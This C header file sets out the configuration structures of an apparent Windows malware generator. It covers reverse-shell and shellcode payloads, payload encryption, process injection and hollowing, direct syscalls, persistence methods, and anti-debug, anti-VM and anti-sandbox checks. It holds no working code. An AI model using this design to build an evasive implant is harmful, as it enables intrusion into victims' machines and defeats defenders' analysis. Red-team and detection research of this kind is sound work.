#ifndef CONFIG_H
#define CONFIG_H

#include <windows.h>

#define MAX_PAYLOAD_SIZE 8192
#define MAX_PROCESS_NAME 256
#define MAX_PATH_LEN 512

typedef enum {
    PAYLOAD_CALC,
    PAYLOAD_REVERSE_SHELL,
    PAYLOAD_CUSTOM_SHELLCODE
} PayloadType;

typedef enum {
    ENCRYPTION_NONE,
    ENCRYPTION_XOR,
    ENCRYPTION_AES,
    ENCRYPTION_RC4
} EncryptionMethod;

typedef enum {
    INJECTION_CREATE_REMOTE_THREAD,
    INJECTION_EARLY_BIRD_APC,
    INJECTION_THREAD_HIJACKING,
    INJECTION_PROCESS_HOLLOWING,
    INJECTION_REMOTE_MAPPING
} InjectionTechnique;

typedef enum {
    API_WINAPI,
    API_NTDLL,
    API_DIRECT_SYSCALLS,
    API_INDIRECT_SYSCALLS
} ApiLevel;

typedef enum {
    PERSISTENCE_NONE,
    PERSISTENCE_REGISTRY_RUN,
    PERSISTENCE_STARTUP_FOLDER,
    PERSISTENCE_SCHEDULED_TASK,
    PERSISTENCE_SERVICE
} PersistenceMethod;

typedef struct {
    BOOL check_peb_being_debugged;
    BOOL check_debug_port;
    BOOL check_debug_object;
    BOOL check_hardware_breakpoints;
    BOOL check_remote_debugger;
} AntiDebugOptions;

typedef struct {
    BOOL check_registry_keys;
    BOOL check_files;
    BOOL check_cpuid;
} AntiVMOptions;

typedef struct {
    BOOL check_sleep_acceleration;
    BOOL check_mouse_movement;
    BOOL check_username;
} AntiSandboxOptions;

typedef struct {
    AntiDebugOptions anti_debug;
    AntiVMOptions anti_vm;
    AntiSandboxOptions anti_sandbox;
    BOOL obfuscate_strings;
} AntiAnalysisOptions;

typedef struct {
    BOOL use_sacrificial;
    CHAR process_name[MAX_PROCESS_NAME];
    DWORD pid;
} TargetProcess;

typedef struct {
    PayloadType payload_type;
    EncryptionMethod encryption;
    InjectionTechnique injection;
    ApiLevel api_level;
    PersistenceMethod persistence;
    AntiAnalysisOptions anti_analysis;
    TargetProcess target;

    BYTE custom_shellcode[MAX_PAYLOAD_SIZE];
    SIZE_T shellcode_size;

    BYTE xor_key;
    BYTE aes_key[32];
    BYTE aes_iv[16];
    BYTE rc4_key[16];

    CHAR lhost[64];
    WORD lport;

    CHAR output_path[MAX_PATH_LEN];
} MalgenConfig;

#endif
